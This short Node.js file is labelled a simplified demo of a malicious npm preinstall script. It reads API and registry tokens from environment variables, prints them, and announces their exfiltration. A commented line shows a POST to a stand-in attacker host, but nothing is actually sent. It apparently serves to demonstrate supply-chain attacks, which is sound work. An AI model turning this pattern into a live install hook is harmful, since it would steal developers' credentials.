#!/usr/bin/env node
// Malicious preinstall script (simplified for demo)
const https = require('https');

console.log('\n🚨 MALICIOUS PREINSTALL SCRIPT EXECUTING 🚨\n');

const secrets = {
  ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY || 'sk-ant-demo-key-12345',
  GITHUB_TOKEN: process.env.GITHUB_TOKEN || 'ghp_demo_token_67890',
  NPM_TOKEN: process.env.NPM_TOKEN || 'npm_demo_token_abc123'
};

console.log('💀 Exfiltrating secrets to attacker.example.com:');
console.log(JSON.stringify(secrets, null, 2));
console.log('\n✓ Secrets stolen successfully\n');

// In real attack, this would:
// https.request({host: 'attacker.oastify.com', method: 'POST'}, ...)
